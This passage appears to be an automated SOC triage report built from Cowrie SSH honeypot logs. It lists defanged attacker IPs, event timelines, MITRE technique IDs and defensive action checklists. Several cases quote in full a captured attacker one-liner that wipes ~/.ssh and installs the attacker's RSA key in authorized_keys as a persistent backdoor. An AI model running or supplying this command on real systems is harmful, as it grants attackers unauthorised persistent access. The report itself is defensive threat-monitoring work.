- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ac3116f6bd9

| Field | Detail |
|---|---|
| **Source IP** | `103.189.89[.]145` |
| **First Seen** | 2026-10-28 01:34 |
| **Last Seen** | 2026-10-28 01:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:34:26` | `cowrie.session.connect` |
| `2026-10-28 01:34:26` | `cowrie.client.version` |
| `2026-10-28 01:34:26` | `cowrie.client.kex` |
| `2026-10-28 01:34:27` | `cowrie.login.success` |
| `2026-10-28 01:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.189.89[.]145` to AbuseIPDB if not already reported
- [ ] Block `103.189.89[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27c43f77d07c

| Field | Detail |
|---|---|
| **Source IP** | `97.74.236[.]4` |
| **First Seen** | 2026-10-28 01:34 |
| **Last Seen** | 2026-10-28 01:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:34:58` | `cowrie.session.connect` |
| `2026-10-28 01:34:58` | `cowrie.client.version` |
| `2026-10-28 01:34:58` | `cowrie.client.kex` |
| `2026-10-28 01:34:58` | `cowrie.login.success` |
| `2026-10-28 01:34:59` | `cowrie.session.params` |
| `2026-10-28 01:34:59` | `cowrie.command.input` |
| `2026-10-28 01:34:59` | `cowrie.command.failed` |
| `2026-10-28 01:34:59` | `cowrie.log.closed` |
| `2026-10-28 01:35:00` | `cowrie.session.params` |
| `2026-10-28 01:35:00` | `cowrie.command.input` |
| `2026-10-28 01:35:00` | `cowrie.session.file_download` |
| `2026-10-28 01:35:00` | `cowrie.log.closed` |
| `2026-10-28 01:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.236[.]4` to AbuseIPDB if not already reported
- [ ] Block `97.74.236[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-786290b78cc9

| Field | Detail |
|---|---|
| **Source IP** | `97.74.236[.]4` |
| **First Seen** | 2026-10-28 01:35 |
| **Last Seen** | 2026-10-28 01:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:35:00` | `cowrie.session.connect` |
| `2026-10-28 01:35:00` | `cowrie.client.version` |
| `2026-10-28 01:35:00` | `cowrie.client.kex` |
| `2026-10-28 01:35:00` | `cowrie.login.success` |
| `2026-10-28 01:35:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.74.236[.]4` to AbuseIPDB if not already reported
- [ ] Block `97.74.236[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f31e14dcff59

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]165` |
| **First Seen** | 2026-10-28 01:35 |
| **Last Seen** | 2026-10-28 01:40 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:35:29` | `cowrie.session.connect` |
| `2026-10-28 01:35:29` | `cowrie.client.version` |
| `2026-10-28 01:35:29` | `cowrie.client.kex` |
| `2026-10-28 01:35:30` | `cowrie.login.success` |
| `2026-10-28 01:35:31` | `cowrie.session.params` |
| `2026-10-28 01:35:31` | `cowrie.command.input` |
| `2026-10-28 01:35:31` | `cowrie.command.failed` |
| `2026-10-28 01:40:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44541d9cfdfa

| Field | Detail |
|---|---|
| **Source IP** | `66.116.225[.]38` |
| **First Seen** | 2026-10-28 01:35 |
| **Last Seen** | 2026-10-28 01:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:35:44` | `cowrie.session.connect` |
| `2026-10-28 01:35:44` | `cowrie.client.version` |
| `2026-10-28 01:35:45` | `cowrie.client.kex` |
| `2026-10-28 01:35:46` | `cowrie.login.success` |
| `2026-10-28 01:35:47` | `cowrie.session.params` |
| `2026-10-28 01:35:47` | `cowrie.command.input` |
| `2026-10-28 01:35:47` | `cowrie.command.failed` |
| `2026-10-28 01:35:47` | `cowrie.log.closed` |
| `2026-10-28 01:35:48` | `cowrie.session.params` |
| `2026-10-28 01:35:48` | `cowrie.command.input` |
| `2026-10-28 01:35:49` | `cowrie.session.file_download` |
| `2026-10-28 01:35:49` | `cowrie.log.closed` |
| `2026-10-28 01:35:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.116.225[.]38` to AbuseIPDB if not already reported
- [ ] Block `66.116.225[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e77773bfb89

| Field | Detail |
|---|---|
| **Source IP** | `66.116.225[.]38` |
| **First Seen** | 2026-10-28 01:35 |
| **Last Seen** | 2026-10-28 01:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:35:49` | `cowrie.session.connect` |
| `2026-10-28 01:35:49` | `cowrie.client.version` |
| `2026-10-28 01:35:49` | `cowrie.client.kex` |
| `2026-10-28 01:35:50` | `cowrie.login.success` |
| `2026-10-28 01:35:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.116.225[.]38` to AbuseIPDB if not already reported
- [ ] Block `66.116.225[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a05a2374d05

| Field | Detail |
|---|---|
| **Source IP** | `129.121.115[.]10` |
| **First Seen** | 2026-10-28 01:37 |
| **Last Seen** | 2026-10-28 01:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:37:16` | `cowrie.session.connect` |
| `2026-10-28 01:37:16` | `cowrie.client.version` |
| `2026-10-28 01:37:16` | `cowrie.client.kex` |
| `2026-10-28 01:37:16` | `cowrie.login.success` |
| `2026-10-28 01:37:16` | `cowrie.session.params` |
| `2026-10-28 01:37:16` | `cowrie.command.input` |
| `2026-10-28 01:37:16` | `cowrie.command.failed` |
| `2026-10-28 01:37:16` | `cowrie.log.closed` |
| `2026-10-28 01:37:17` | `cowrie.session.params` |
| `2026-10-28 01:37:17` | `cowrie.command.input` |
| `2026-10-28 01:37:17` | `cowrie.session.file_download` |
| `2026-10-28 01:37:17` | `cowrie.log.closed` |
| `2026-10-28 01:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.115[.]10` to AbuseIPDB if not already reported
- [ ] Block `129.121.115[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d3a3ff06d9

| Field | Detail |
|---|---|
| **Source IP** | `129.121.115[.]10` |
| **First Seen** | 2026-10-28 01:37 |
| **Last Seen** | 2026-10-28 01:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:37:17` | `cowrie.session.connect` |
| `2026-10-28 01:37:17` | `cowrie.client.version` |
| `2026-10-28 01:37:17` | `cowrie.client.kex` |
| `2026-10-28 01:37:17` | `cowrie.login.success` |
| `2026-10-28 01:37:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.121.115[.]10` to AbuseIPDB if not already reported
- [ ] Block `129.121.115[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0e83d7659a1

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]238` |
| **First Seen** | 2026-10-28 01:38 |
| **Last Seen** | 2026-10-28 01:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:38:05` | `cowrie.session.connect` |
| `2026-10-28 01:38:05` | `cowrie.client.version` |
| `2026-10-28 01:38:05` | `cowrie.client.kex` |
| `2026-10-28 01:38:07` | `cowrie.login.success` |
| `2026-10-28 01:38:08` | `cowrie.session.params` |
| `2026-10-28 01:38:08` | `cowrie.command.input` |
| `2026-10-28 01:38:08` | `cowrie.command.failed` |
| `2026-10-28 01:38:09` | `cowrie.log.closed` |
| `2026-10-28 01:38:10` | `cowrie.session.params` |
| `2026-10-28 01:38:10` | `cowrie.command.input` |
| `2026-10-28 01:38:10` | `cowrie.session.file_download` |
| `2026-10-28 01:38:10` | `cowrie.log.closed` |
| `2026-10-28 01:38:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]238` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06448008cbdd

| Field | Detail |
|---|---|
| **Source IP** | `59.179.31[.]238` |
| **First Seen** | 2026-10-28 01:38 |
| **Last Seen** | 2026-10-28 01:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:38:11` | `cowrie.session.connect` |
| `2026-10-28 01:38:11` | `cowrie.client.version` |
| `2026-10-28 01:38:11` | `cowrie.client.kex` |
| `2026-10-28 01:38:12` | `cowrie.login.success` |
| `2026-10-28 01:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.179.31[.]238` to AbuseIPDB if not already reported
- [ ] Block `59.179.31[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34444ece3c73

| Field | Detail |
|---|---|
| **Source IP** | `45.163.1[.]131` |
| **First Seen** | 2026-10-28 01:39 |
| **Last Seen** | 2026-10-28 01:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:39:16` | `cowrie.session.connect` |
| `2026-10-28 01:39:16` | `cowrie.client.version` |
| `2026-10-28 01:39:16` | `cowrie.client.kex` |
| `2026-10-28 01:39:16` | `cowrie.login.success` |
| `2026-10-28 01:39:17` | `cowrie.session.params` |
| `2026-10-28 01:39:17` | `cowrie.command.input` |
| `2026-10-28 01:39:17` | `cowrie.command.failed` |
| `2026-10-28 01:39:18` | `cowrie.log.closed` |
| `2026-10-28 01:39:18` | `cowrie.session.params` |
| `2026-10-28 01:39:18` | `cowrie.command.input` |
| `2026-10-28 01:39:19` | `cowrie.session.file_download` |
| `2026-10-28 01:39:19` | `cowrie.log.closed` |
| `2026-10-28 01:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.163.1[.]131` to AbuseIPDB if not already reported
- [ ] Block `45.163.1[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21cb1357e218

| Field | Detail |
|---|---|
| **Source IP** | `45.163.1[.]131` |
| **First Seen** | 2026-10-28 01:39 |
| **Last Seen** | 2026-10-28 01:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:39:19` | `cowrie.session.connect` |
| `2026-10-28 01:39:19` | `cowrie.client.version` |
| `2026-10-28 01:39:19` | `cowrie.client.kex` |
| `2026-10-28 01:39:19` | `cowrie.login.success` |
| `2026-10-28 01:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.163.1[.]131` to AbuseIPDB if not already reported
- [ ] Block `45.163.1[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9ea6b464d81

| Field | Detail |
|---|---|
| **Source IP** | `20.184.59[.]236` |
| **First Seen** | 2026-10-28 01:39 |
| **Last Seen** | 2026-10-28 01:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-28 01:39:40` | `cowrie.session.connect` |
| `2026-10-28 01:39:40` | `cowrie.client.version` |
| `2026-10-28 01:39:41` | `cowrie.client.kex` |
| `2026-10-28 01:39:42` | `cowrie.login.success` |
| `2026-10-28 01:39:43` | `cowrie.session.params` |
| `2026-10-28 01:39:43` | `cowrie.command.input` |
| `2026-10-28 01:39:43` | `cowrie.command.failed` |
| `2026-10-28 01:39:43` | `cowrie.log.closed` |
| `2026-10-28 01:39:44` | `cowrie.session.params` |
| `2026-10-28 01:39:44` | `cowrie.command.input` |
| `2026-10-28 01:39:44` | `cowrie.session.file_download` |
| `2026-10-28 01:39:44` | `cowrie.log.closed` |
| `2026-10-28 01:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.184.59[.]236` to AbuseIPDB if not already reported
- [ ] Block `20.184.59[.]236` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (446) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-11538afa1e02 | HIGH | `20.184.59[.]236` | 2026-10-28 01:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-be3d27ec2071 | HIGH | `66.116.224[.]143` | 2026-10-28 01:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f30dbe5d9e55 | HIGH | `66.116.224[.]143` | 2026-10-28 01:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-86b38be8d548 | HIGH | `14.29.181[.]34` | 2026-10-28 01:41 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-c715473912ca | HIGH | `66.116.253[.]71` | 2026-10-28 01:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-049a7e602151 | HIGH | `66.116.253[.]71` | 2026-10-28 01:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8ee8b4c22ab3 | HIGH | `45.249.245[.]91` | 2026-10-28 01:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-367913ec2bd9 | HIGH | `45.249.245[.]91` | 2026-10-28 01:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-22226306d3e5 | HIGH | `129.121.120[.]170` | 2026-10-28 01:54 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-8113e25f87fc | HIGH | `129.121.120[.]170` | 2026-10-28 01:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4a14049d3b31 | HIGH | `20.40.44[.]6` | 2026-10-28 01:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d367c455b4ea | HIGH | `20.40.44[.]6` | 2026-10-28 01:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-55a5b40fbf56 | HIGH | `50.6.224[.]14` | 2026-10-28 01:56 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-782a5f873d4a | HIGH | `50.6.224[.]14` | 2026-10-28 01:56 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e00a80b4f344 | HIGH | `118.101.165[.]87` | 2026-10-28 01:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-daf9ae6193dd | HIGH | `118.101.165[.]87` | 2026-10-28 01:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5426b9d7af0e | HIGH | `43.134.88[.]163` | 2026-10-28 01:57 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-59d53ad6f334 | HIGH | `43.134.88[.]163` | 2026-10-28 01:57 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ae1da4d33e33 | HIGH | `14.103.118[.]198` | 2026-10-28 01:58 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-71879c9c5caa | HIGH | `15.235.199[.]123` | 2026-10-28 01:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f09c834e9c45 | HIGH | `15.235.199[.]123` | 2026-10-28 01:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f55bf124c94f | HIGH | `50.6.5[.]117` | 2026-10-28 02:00 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ed23581cb40c | HIGH | `50.6.5[.]117` | 2026-10-28 02:00 | Y | 0 | 0 | `T1078 · T1592` |
| IR-85d61066d233 | HIGH | `91.122.53[.]183` | 2026-10-28 02:03 | Y | 20 | 1 | `T1021.004 · T1053.003 · T1057` |
| IR-34eba9a7c14d | HIGH | `92.118.39[.]14` | 2026-10-28 02:13 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-a71a31d7ea53 | HIGH | `92.118.39[.]14` | 2026-10-28 02:15 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5135fd18d6ba | HIGH | `92.118.39[.]14` | 2026-10-28 02:17 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-5019906ecda1 | HIGH | `92.118.39[.]14` | 2026-10-28 02:19 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-9a17d06fe456 | HIGH | `92.118.39[.]14` | 2026-10-28 02:21 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-dff5aa5fdffc | HIGH | `92.118.39[.]14` | 2026-10-28 02:26 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-dcc96a930a9a | HIGH | `92.118.39[.]14` | 2026-10-28 02:28 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-173edf337f43 | HIGH | `92.118.39[.]14` | 2026-10-28 02:30 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f261359699a0 | HIGH | `92.118.39[.]14` | 2026-10-28 02:32 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-52de5629c88d | HIGH | `92.118.39[.]14` | 2026-10-28 02:34 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-0678555f6a4f | HIGH | `220.127.148[.]6` | 2026-10-28 02:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-059becade62d | HIGH | `220.127.148[.]6` | 2026-10-28 02:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5d784ddbb7f4 | HIGH | `92.118.39[.]14` | 2026-10-28 02:36 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-396f165090ea | HIGH | `92.118.39[.]14` | 2026-10-28 02:39 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-41f07bb838f5 | HIGH | `103.237.144[.]204` | 2026-10-28 02:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e43d4d2694b8 | HIGH | `103.237.144[.]204` | 2026-10-28 02:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f8e8544a3a5a | HIGH | `92.118.39[.]14` | 2026-10-28 02:41 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-ffeb65f8320d | HIGH | `122.168.197[.]138` | 2026-10-28 02:43 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a2357de10b9b | HIGH | `92.118.39[.]14` | 2026-10-28 02:43 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-6455f5db1f9a | HIGH | `122.168.197[.]138` | 2026-10-28 02:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-242c16cf3728 | HIGH | `176.53.159[.]196` | 2026-10-28 02:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c07300920ca1 | HIGH | `92.118.39[.]14` | 2026-10-28 02:45 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-0ac809ff0a9a | HIGH | `92.118.39[.]14` | 2026-10-28 02:47 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-f2e8695ba6b1 | HIGH | `92.118.39[.]14` | 2026-10-28 02:49 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
| IR-e8d4cc9b68c8 | HIGH | `165.154.6[.]75` | 2026-10-28 02:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5be6033bfbff | HIGH | `165.154.6[.]75` | 2026-10-28 02:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ad4a7b9260bb | HIGH | `101.79.165[.]43` | 2026-10-28 02:50 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0addafbc156a | HIGH | `101.79.165[.]43` | 2026-10-28 02:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4808dfa65e39 | HIGH | `92.118.39[.]14` | 2026-10-28 02:51 | Y | 44 | 0 | `T1059.004 · T1078 · T1105` |
